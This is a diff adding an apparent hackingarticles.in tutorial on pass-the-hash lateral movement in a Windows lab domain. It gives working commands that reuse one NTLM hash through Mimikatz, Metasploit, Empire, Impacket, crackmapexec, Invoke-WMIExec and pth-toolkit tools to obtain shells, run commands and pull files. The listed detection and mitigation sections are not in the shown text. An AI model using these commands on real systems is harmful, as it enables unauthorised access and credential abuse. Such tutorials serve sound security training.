@@ -1,0 +1,300 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Lateral Movement: Pass the Hash Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" rel="bookmark"><time class="entry-date published" datetime="2020-05-14T14:36:54+00:00">May 14, 2020</time><time class="updated" datetime="2025-05-14T17:51:32+00:00">May 14, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">If you have been in the Information Security domain anytime in the last 20 years, you may have heard about Pass-the-Hash or PtH attack. It is very effective and it punishes very hard if ignored. This was so effective that it led Microsoft Windows to make huge changes in the way they store credentials and use them for authentication. Even after so many changes, updates, and patches PtH is a problem that just won’t go. Let’s look into it.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>History of PtH</strong></span></li>
+<li><span style="color: #000000;"><strong>Microsoft’s “Fix” </strong></span></li>
+<li><span style="color: #000000;"><strong>Introduction to Hashing and NTLM</strong></span></li>
+<li><span style="color: #000000;"><strong>Working of PtH</strong></span></li>
+<li><span style="color: #000000;"><strong>Zeros instead of LM Hashes</strong></span></li>
+<li><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
+<li><span style="color: #000000;"><strong>Pass-the-Hash Attacks</strong></span></li>
+<li><span style="color: #000000;"><strong>Mimikatz</strong></span></li>
+<li><span style="color: #000000;"><strong>PtH Over SMB</strong></span>
+<ul>
+<li><span style="color: #000000;">Metasploit scanner/smb/smb_login</span></li>
+<li><span style="color: #000000;">Empire lateral_movement/invoke_smbexec</span></li>
+<li><span style="color: #000000;">Impacket smbclient</span></li>
+<li><span style="color: #000000;">pth-smbclient</span></li>
+<li><span style="color: #000000;">crackmapexec</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>PtH Over PsExec</strong></span>
+<ul>
+<li><span style="color: #000000;">Metasploit windows/smb/psexec</span></li>
+<li><span style="color: #000000;">Metasploit admin/smb/psexec_command</span></li>
+<li><span style="color: #000000;">Impacket psexec</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>PtH Over WMI</strong></span>
+<ul>
+<li><span style="color: #000000;">Impacket wmiexec</span></li>
+<li><span style="color: #000000;">PowerShell Invoke-WMIExec</span></li>
+<li><span style="color: #000000;">pth-wmic</span></li>
+<li><span style="color: #000000;">wmic.exe</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>PtH Over RPC</strong></span>
+<ul>
+<li><span style="color: #000000;">Impacket rpcdump</span></li>
+<li><span style="color: #000000;">pth-rpcclient</span></li>
+<li><span style="color: #000000;">pth-net</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Pass the Hash Tools</strong></span>
+<ul>
+<li><span style="color: #000000;">PTH Toolkit</span>
+<ul>
+<li><span style="color: #000000;">pth-winexe</span></li>
+<li><span style="color: #000000;">pth-curl</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Impacket</span>
+<ul>
+<li><span style="color: #000000;">Impacket atexec</span></li>
+<li><span style="color: #000000;">Impacket lookupsid</span></li>
+<li><span style="color: #000000;">Impacket samrdump</span></li>
+<li><span style="color: #000000;">Impacket reg</span></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>PtH Detection</strong></span></li>
+<li><span style="color: #000000;"><strong>PtH Mitigation</strong></span></li>
+<li><span style="color: #000000;"><strong>References</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion </strong></span></li>
+</ul>
+<h3><span style="color: #800000;">History of PtH</span></h3>
+<p><span style="color: #000000;">One of the first things that I learned in exploitation was after gaining the session, one should hunt for credentials and/or hashes. It is one of the fundamental activities that an attacker performs after the initial exploit. From a Red Teamer’s perspective, PtH is a part of the Lateral Movement. After gaining hashes it is up to the attacker to what they decide to do with the hash. They can try their hand at cracking it. But as we all know that it is difficult, time-consuming, and still no guarantee of gaining the correct password. Then there is this other way. </span></p>
+<p><span style="color: #000000;">During authentication, the basic procedure is the password is collected from the user, then it is encrypted and then the encrypted hash of the correct password is used for future authentication. After the initial authentication, Windows keeps the hash in its memory so that the user doesn’t have to enter the password again and again.</span><span style="color: #000000;">During Credential Dumping, we see that we have extracted lots and lots of hashes. Now as an attacker we don’t know the password. So, during the authentication, we provide the hash instead of the password. Windows compares the hashes and welcomes the attacker with open arms. This is what a Pass-the-Hash attack is in a nutshell.</span></p>
+<h3><span style="color: #800000;">Microsoft’s “Fix” </span></h3>
+<p><span style="color: #000000;">Microsoft replaced RC4 encryption with AES encryption as well as the Credential Guard was introduced. This led many users to believe that PtH attacks are gone for good. But the reality was different. These changes made the attacks difficult to perform but they never really solved the problem at its core. This changes that were introduced made some techniques and tools useless. But some were still working. This created a sense of confusion among the community. I hope I will be able to shed some light on these.</span></p>
+<h3><span style="color: #800000;">Introduction to Hashing and NTLM</span></h3>
+<p><span style="color: #000000;">A cryptographic Hash function is an algorithm that takes an arbitrary block of data and returns a fixed-size bit string, the hash value, such that a change in data will change the hash value. In other words, this means that you take a block of text in our case the password and run it through some magic function and if you made a small change in the password you would end up with a completely different value.</span></p>
+<p><span style="color: #000000;">Microsoft ever since the release of Windows 10 uses the NTLMv2 authentication protocol. Single Sign-On system was also introduced which keeps the credentials cached in the memory so that it can later be used.</span></p>
+<h3><span style="color: #800000;">Working of PtH</span></h3>
+<p><span style="color: #000000;">PtH attack works in 2 steps</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Extraction of hashes</strong> – This can be done from a machine that the attacker directly attacked or from the machine that was in the same network as the compromised machine.</span></li>
+<li><span style="color: #000000;">Using the hashes to <strong>gain access</strong> to the compromised machine or another machine.</span></li>
+</ol>
+<p><span style="color: #000000;">The NTLM is a suite of Microsoft security protocol that provides authentication, integrity, and confidentiality to users. The NT hash is the 16-byte result of the Unicode password sent through the MD4 hash function.</span></p>
+<p><strong>Note:</strong> This article focuses on using the hash to bypass authentication or Passing the Hash. It doesn’t teach how to get those hashes. You could refer to the Credential Dumping series of articles to learn about the extraction of hashes.</p>
+<h4><span style="color: #800000;">Extraction of Hashes</span></h4>
+<ul>
+<li><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-sam/">Credential Dumping: SAM</a></span></strong></li>
+<li><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-ntds-dit/">Credential Dumping: NTDS.dit</a></span></strong></li>
+<li><a href="https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/"><strong><span style="color: #0000ff;">Credential Dumping: Local Security Authority (LSA|LSASS.EXE)</span></strong></a></li>
+</ul>
+<p><span style="color: #000000;"><strong>Note:</strong> Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.</span></p>
+<h3><span style="color: #800000;">Zeros instead of LM Hashes</span></h3>
+<p><span style="color: #000000;">As from the release of Windows 10 the Microsoft made the change that LM hashes are not used anymore. But the tools that we are going to use in the practical are being used since the old NT and LM times. So, in those tools, we will be using a string of 32 zeros instead of the LM hash.</span></p>
+<h3><span style="color: #800000;">Configurations used in Practical</span></h3>
+<h3><span style="color: #000000;"><strong>Attacker Machine</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>OS:</strong> Kali Linux 2020.1</span></li>
+<li><span style="color: #000000;"><strong>IP Address: </strong>192.168.1.112</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Target Machine</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Server</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>OS:</strong> Windows Server 2016</span></li>
+<li><span style="color: #000000;"><strong>IP Address: </strong>192.168.1.105</span></li>
+<li><span style="color: #000000;"><strong>Domain: </strong>ignite.local</span></li>
+<li><span style="color: #000000;"><strong>User:</strong> Administrator</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Client</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>OS:</strong> Windows 10</span></li>
+<li><span style="color: #000000;"><strong>IP Address: </strong>192.168.1.106</span></li>
+<li><span style="color: #000000;"><strong>User:</strong> Yashika</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Pass-the-Hash Attacks</span></h3>
+<p><span style="color: #000000;">PtH attacks can work over a large number of scenarios and technologies. First, we will discuss the PtH attacks over famous protocols and technologies and then we will give a brief introduction about the different toolkits that help us in performing the PtH attacks. We will be performing attacks over protocols like SMB, PsExec, WMI, RPC, RDP. This should be noted that this attack is limited to the user that it uses the hashes of. Suppose the hashes that were passed don’t have much permission then the attacker is also limited to that extent. Before moving onto different technologies or protocols, Let’s perform a PtH using Mimikatz. </span></p>
+<p><span style="color: #000000;">Mimikatz is the ultimate tool when it comes to getting toe to toe with Windows Security. We used the Administrator and the Hash. We need to also mention the domain as well. This task requires elevated privilege and we need to perform the privilege debug as well. We used the NTLM hash which is stored as the RC4 hash. We can see that the mimikatz tells us that the RC4 hashes. After the completion, it opens a command prompt as shown in the image given below, as the user Administrator.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38</pre>
+<pre class="lang:default decode:true "><img decoding="async" src="https://1.bp.blogspot.com/-TjYcf0ZPLzM/Xr1QR-Oj9mI/AAAAAAAAkCg/AkE91KVE8hMjEbcVewEXbCEXkELmmkQ_gCLcBGAsYHQ/s1600/1.png"/></pre>
+<h3><span style="color: #800000;">PtH Over SMB</span></h3>
+<p><span style="color: #000000;">Over the network that the protocol that does most of the heavy lifting is the SMB protocol. We will start with basic methods like Metasploit.</span></p>
+<h4><span style="color: #800000;">Metasploit: smb_login</span></h4>
+<p><span style="color: #000000;">Metasploit has an auxiliary that is used for logging into the network through the SMB. It requires a set of options that are needed to be defined. We decided to use the dictionary for users and hashes. We collected a bunch of hashes and usernames in our initial enumeration and then used them with this exploit that will perform the attack telling us that which of the users and hash combination can be used for the logging in on the particular Machine in the Network.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/smb/smb_login
+set rhosts 192.168.1.105
+set user_file user.txt
+set pass_file pass.txt
+set smbdomain ignite
+exploit</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-z8M_7WyJmDk/Xr1QU67PhII/AAAAAAAAkDI/yDbCSMopNjo-tmOi075nPDvvj6yhBQ0fQCLcBGAsYHQ/s1600/2.png"/></p>
+<h4><span style="color: #800000;">Empire: Invoke_smbexec</span></h4>
+<p><span style="color: #000000;">For the people who cringe on Metasploit, PowerShell Empire has your back. There is a lateral movement module that is loosely based on Invoke-SMBExec.ps1 can also be used to login using the hash of the user. We will be using the Administrator user with its hash for this practical. As we discussed earlier that Windows now don’t use the LM hash, so we will use the sequence of 32 zeros in place of the LM hash. After providing the various options we execute the module as shown in the image given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule lateral_movement/invoke_smbexec
+set ComputerName WIN-S0V7KMTVLD2.ignite.local
+set Username Administrator
+set Hash 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38
+set Listener http
+execute</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zt07cxlGBvY/Xr1QW5xwtsI/AAAAAAAAkDk/1xbWuFkjb4oJUcsUNaYBV1KLZBU5p1FrgCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">The attack works successfully and gave us a session for the user Administrator. We ran the ipconfig command to verify the session as shown in the image below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-KxAilzzbGRE/Xr1QXOq8EgI/AAAAAAAAkDo/Bcjw4y_kkHstVSn0PmeCKQdXoyluuE-YACLcBGAsYHQ/s1600/4.png"/></p>
+<h4><span style="color: #800000;">Impacket: smbclient.py</span></h4>
+<p><span style="color: #000000;">Impacket is one of the most versatile toolkits which help us during our interaction with the Servers. The simplicity of getting work done in just a single line of command is what makes it special for me. Impacket Toolkit has the smbclient.py file which can help the attacker interact with the SMB. It usually requires the password for the login but I thought what if we give it the hash. It was no surprise that this Impacket script didn’t let me down. Again, we used the hash with the zeros just to be safe. It requires the username, hashes, domain. It also requires the IP Address as we are running it on Kali Linux and Kali is not part of the internal network of the Domain Controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-bx3zDInrFPI/Xr1QXFRhk2I/AAAAAAAAkDs/e0V8Jc46fgwOCN0zNiVY2bjk2N7XK-RNgCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">After connecting you can run a bunch of commands to interact with the SMB. Read more: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/impacket-guide-smb-msrpc/">Impacket Guide: SMB/MSRPC</a></strong></span></span></p>
+<h4><span style="color: #800000;">PTH-smbclient </span></h4>
+<p><span style="color: #000000;">PTH is a toolkit inbuilt in Kali Linux. We will talk about it a bit later. But it can also perform the PtH attack over SMB services. It also requires the same basic information to perform the attack. It requires the domain, Username, IP Address, and Password. We gave the password hash as shown in the image below and we can see that it provides the access of the targeted system. This is a nice fast script that can perform PtH attacks</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-kyCijKhib7U/Xr1QXrrqa4I/AAAAAAAAkDw/9TJ55eId71oAUBqMUnpyAd0Dg-gXwmrxgCLcBGAsYHQ/s1600/6.png"/></p>
+<h4><span style="color: #800000;">Crackmapexec</span></h4>
+<p><span style="color: #000000;">Crackmapexec is my favourite tool, the ability and the speed at which it performs tasks is astonishing. We can perform a PtH attack and execute commands on the target machine using crackmapexec. It requires the IP Address, Username, Password, and the command that we want to execute. We can use the hash instead of the password. We didn’t use the hash with zeros because it can work with the NT hashes easily.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-7puQt1wFvSc/Xr1QYEYSHcI/AAAAAAAAkD0/8nD-bu6sj4Yr5wW8nx2a6DSa7JIhmn4NQCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">Read More about Crackmapexec: <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/">Lateral Moment on Active Directory: CrackMapExec</a></span></strong></span></p>
+<h3><span style="color: #800000;">PtH over PsExec</span></h3>
+<p><span style="color: #000000;">PsExec is a tool that lets the System Administrators execute processes on other systems. It is full of interactivity for console applications. It is an executable file and there is no need to install it, it works right out of the box. PsExec’s mostly used for launching interactive command-prompts on remote systems and remote-enabling tools like Ipconfig that otherwise cannot show information about remote systems. PsExec works on SMB but since it is so common in the industry that it deserves an individual category.</span></p>
+<h4><span style="color: #800000;">Metasploit: psexec</span></h4>
+<p><span style="color: #000000;">As always let’s start from our dependable framework, Metasploit. A quick search gave us the psexec exploit. It requires a set of parameters that are Target IP Address, Username, Password, and Domain. We tried to pass the hashes instead of the password and it worked like charm. It will open a meterpreter session over the target machine for the user we provided hashes for.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/psexec
+set rhosts 192.168.1.105
+set smbuser administrator
+set smbdomain ignite
+set smbpass 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38
+exploit</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-o20XewWyubI/Xr1QYqNU1zI/AAAAAAAAkD4/YCFVdP4CO5gX28flMSCzoajCYLGaZmwcgCLcBGAsYHQ/s1600/8.png"/></p>
+<h4><span style="color: #800000;">Metasploit: psexec_command</span></h4>
+<p><span style="color: #000000;">While we were working on the Metasploit in our previous practical we saw that we have another exploit by the name of psexec command. This one executes the command on the remote machine. This is more effective as it is stealthier and leaves no trace. Executing a particular command and then it exits. Requirements are quite similar to the one above but it does require the command that you want to execute on the target machine. In this scenario, we gave the command “net user” and it showed us the users on the machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use admin/smb/psexec_command
+set rhosts 192.168.1.105
+set smbdomain ignite
+set smbuser administrator
+set smbpass 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38
+set command net user
+run</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-KSmEH_MfWlI/Xr1QZN2mvQI/AAAAAAAAkD8/EeIzyfFuoI4fbLqdAIsUudLmFqU7xlKYACLcBGAsYHQ/s1600/9.png"/></p>
+<h4><span style="color: #800000;">Impacket: psexec.py</span></h4>
+<p><span style="color: #000000;">Impacket has its script for psexec. This is also one of the reasons that made me create a different category for the psexec. The working is strikingly similar to the smbclient.py that we worked on earlier but the difference is the type of shell we get. Previously we got the SMB shell but here we get the proper shell from the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-SAmFS2oMVWU/Xr1QSB1I6gI/AAAAAAAAkCk/zWksheZK-ssiG-dyzJmUkAXx95EEtwLdQCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">That concludes the PsExec as well as the SMB section of PtH attacks. Let’s move onto the WMI section.</span></p>
+<h3><span style="color: #800000;">PtH Over WMI</span></h3>
+<p><span style="color: #000000;">Windows Management Instrumentation is a set of specifications form Microsoft that consolidates the management of devices and applications in a network from Windows. WMI provides users with information as well as gives access to perform a variety of management tasks. This access is monitored by the Authentications. As we have the authentication, we will perform the PtH attacks to break into that authentication.</span></p>
+<h4><span style="color: #800000;">Impacket: wmiexec.py</span></h4>
+<p><span style="color: #000000;">Impacket have the script that can use the WMI to get a session on the machine to perform a variety of tasks. It requires the credentials for the user for performing those tasks. We will be using the hash instead of the password to see if we can get ourselves a session on the target machine using wmiexec.py. Requirements consist of Username, IP Address, and hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python wmiexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-k5vm0HLeOD8/Xr1QSGdJCkI/AAAAAAAAkCo/-cKy00i6vUwzAb8_EGeUnQATBV3Y6MCiQCLcBGAsYHQ/s1600/11.png"/></p>
+<h3><span style="color: #800000;">PowerShell: Invoke-WMIExec</span></h3>
+<p><span style="color: #000000;">A useful PowerShell script designed by <a style="color: #000000;" href="https://twitter.com/kevin_robertson?lang=en">Kevin Robertson</a> named Invoke-WMIExec is one of the methods to access the WMI remotely. It works quite similarly to the Impacket script that we just used. However, it can perform tasks over the Target machine. It won’t provide a session. Suppose we have to alter some settings or polices over another system remotely this script can help us in such a scenario. It requires the Target IP Address, domain, Username and it accepts the hash also. Then we need to provide the command to execute. I decided to create a folder over the remote system named hacked. So, I crafted the script as shown below.</span></p>
+<p><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1">Download Invoke-WMIExec.ps1</a></span></strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-WMIExec -Target 192.168.1.105 -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-i3jIZw4N4IA/Xr1QSnDrN5I/AAAAAAAAkCs/RKtJl08AnE0cjjvRwmZ2vB0JFxWkyZ6PgCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">Here, we can see that a folder has been created by the name of hack on the remote system that we gave the IP Address and the hashes of.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5X3B6lnuSkA/Xr1QSz7ItHI/AAAAAAAAkCw/4UgI2FndlVYCUS0DkqFzgKs4negnXEfWgCLcBGAsYHQ/s1600/13.png"/></p>
+<h4><span style="color: #800000;">PTH-wmic</span></h4>
+<p><span style="color: #000000;">We come back to our PTH scripts. They also have something for the WMI interface. It is called pth-wmic. As before there is no need to install it. It will run directly from the terminal of Kali Linux. We just need to provide the domain, username, hash, IP Address, and the command that we want to execute. Remember that the commands that this script executes are of WMI only. So other commands won’t work through this method. Here in this scenario, we decided to extract the users from the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-wmic -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 "select Name from Win32_UserAccount"</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-H_iXLKwQR7s/Xr1QTm11oYI/AAAAAAAAkC4/yA7yYHvFW0stFK_U_h3tscCTkSFhMzYRgCLcBGAsYHQ/s1600/14.png"/></p>
+<h4><span style="color: #800000;">Wmiexec.exe</span></h4>
+<p><span style="color: #000000;">Alas! For the people who love to just up and go. That’s right I am talking about the people who love and would kill for an executable. I am not one of those people as I want to tinker with the code but still, this executable gets the work done no questions asked. It is made from the Impacket wmiexec.py script. Hence it requires the same parameters as domain, username, IP Address, and hashes. It invokes a shell with the privileges of the user that we provided the credentials for.</span></p>
+<p><span style="color: #000000;">Download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe">Wmiexec.exe</a></strong></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-QG2BG3LmB-k/Xr1QTbBfTpI/AAAAAAAAkC0/WJuFsyfwfYww6hvc9MNQLweh-SxIzwdOwCLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">That’s all for the PtH attacks over the WMI. Now let’s move over to the fabulous RPC.</span></p>
+<h3><span style="color: #800000;">PtH Over RPC</span></h3>
+<p><span style="color: #000000;">RPC or Remote Procedure Call is a famous protocol that one program uses to request a particular service located on a remote system in the network. It can be used to retrieve Endpoints from a particular Target Machine if we can pass the hashes through its authentication.</span></p>
+<h4><span style="color: #800000;">Impacket: rpcdump.py</span></h4>
+<p><span style="color: #000000;">Impacket has developed yet another wonderful script that can help us extract the list of RPC endpoints over the target machine. As it requires the authentication so we will be attacking it via PtH to get those endpoints dumped on our Attacker Machine. It requires domain, username, IP Address, and the hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-B_a2WSpXDvc/Xr1QT1wcomI/AAAAAAAAkC8/hdKFUBZGoFoaeP0ggNJ87741V7ACV6IbwCLcBGAsYHQ/s1600/16.png"/></p>
+<h4><span style="color: #800000;">PTH-rpcclient </span></h4>
+<p><span style="color: #000000;">The PTH Toolkit has a solution for the RPC protocol as well. It can open up an interactive session that can be used to execute some of the RPC commands. These commands can come quite handy when you are gathering intel about the network and other details. We can also extract the information about the system that we have gotten access through by using what we call a server info command as shown in the image. This tool requires the domain, username, hash, and the IP Address in the following format:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-rpcclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-en2pNRjA5po/Xr1QUNtohRI/AAAAAAAAkDA/LcYhOvZ2bQg5LV7JNJLkcizFi2XM3hwXACLcBGAsYHQ/s1600/17.png"/></p>
+<h4><span style="color: #800000;">PTH-net</span></h4>
+<p><span style="color: #000000;">PTH-net is a tool that can be used to execute the net commands such as the net user, net share, and other important commands but the reason that we decided to include it into the PtH Over RPC section is that it can work on the RPC protocol to perform those tasks. Here we decided to gather the intel about the active shares over the network and we got all of them in a matter of seconds and that too because we passed the hashes of the user, we don’t have the password for. This requires the protocol to be used, the command to run, domain, username, hashes, IP Address.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-net rpc share list -U 'ignite\Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38' -S 192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hXPHJ5uZ9pk/Xr1QUXwI-CI/AAAAAAAAkDE/vDc-kjyYb-wXrTP1FyBfokPtj5tFsxmEACLcBGAsYHQ/s1600/18.png"/></p>
+<h3><span style="color: #800000;">Pass the Hash Tools</span></h3>
+<h4><span style="color: #800000;">PTH Toolkit</span></h4>
+<p><span style="color: #000000;">Back in 2012 a bunch of pass-the-hash scripts was introduced in the BlackHat USA conference that year. They were available on the Google Code Archive. Due to their usability and popularity, Kali Linux introduced them to the 2013 release. They included the following scripts in their pth-toolkit.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>pth-curl</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-rpcclient</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-smbget</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-winexe</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-wmic</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-net</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-smbclient</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-sqsh</strong></span></li>
+<li><span style="color: #000000;"><strong>pth-wmic</strong></span></li>
+</ul>
+<p><span style="color: #000000;">They helped in performing the Pass-The-Hash attacks over the network. We already showed some of these earlier, now let’s focus on others.</span></p>
+<h5><strong><span style="color: #000000;">PTH-winexe</span></strong></h5>
+<p><span style="color: #000000;">We are already familiar with the winexe command that executes the remote Windows command. But to do so we need to provide the user credentials and the IP Address of the target machine. This tool allows us to use the hash for authentication instead of the password. So, we need to provide the username, hash, IP Address, and command or name of executable we want to execute. Here we decide to execute the cmd to get a shell. We got into the System32 folder. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-winexe -U Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 cmd.exe</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-lYmwP9XlZyI/Xr1QVc6UZVI/AAAAAAAAkDM/TM6EN2jgteEzyaRAi16SPM3_w5iAlVxBwCLcBGAsYHQ/s1600/21.png"/></p>
+<p><span style="color: #000000;">Now to demonstrate the next tool, we traversed to the inetpub\wwwroot directory. And we showed that there is file.txt located there.</span></p>
+<p><span style="color: #000000;"><strong>Note:</strong> The inetpub directory is created upon the installation of the IIS server.</span></p>
+<h5><strong><span style="color: #000000;">PTH-curl</span></strong></h5>
+<p><span style="color: #000000;">The magical curl command that helps us achieve so many things, who thought that it would be useful as in the PtH attack as well. Now curl can extract a particular file from the target server by authenticating it. We used the pth-curl tool to perform a PtH attack and used the hash for the authentication and downloaded the file.txt from the target machine that was visible in the screenshot above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-curl --ntlm -u Administrator:32196B56FFE6F45E294117B91A83BF38 http://192.168.1.105/file.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-QbeD43cW-88/Xr1QVWlf4sI/AAAAAAAAkDQ/acV87wMR1kYOMmVKh_RnFeYesiJ8oQJdQCLcBGAsYHQ/s1600/22.png"/></p>
